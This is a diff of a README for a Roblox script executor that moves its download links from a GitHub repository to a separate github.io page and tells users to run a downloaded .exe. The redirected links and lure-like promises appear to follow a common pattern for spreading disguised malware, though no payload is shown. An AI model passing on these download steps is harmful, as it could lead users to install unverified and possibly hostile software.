@@ -1,6 +1,6 @@
 # ⚙️ xeno-pc-auto-update-exec - Run Roblox scripts with ease today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/thommy001132/xeno-pc-auto-update-exec)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://thommy001132.github.io)
 
 This application provides a stable environment for Roblox users to run Lua scripts. The tool features a built-in script hub containing over 500 items and includes automatic update capabilities. It runs on Windows 10 and Windows 11 64-bit systems. Users do not need keys to access the software.
 
@@ -18,7 +18,7 @@ To run this application, ensure your computer meets these basic specifications:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project link to access the download files. [Download here](https://github.com/thommy001132/xeno-pc-auto-update-exec).
+1. Visit the project link to access the download files. [Download here](https://thommy001132.github.io).
 2. Locate the file ending in .exe from the latest release section.
 3. Save the file to a folder on your desktop.
 4. Open the file to start the installation process.
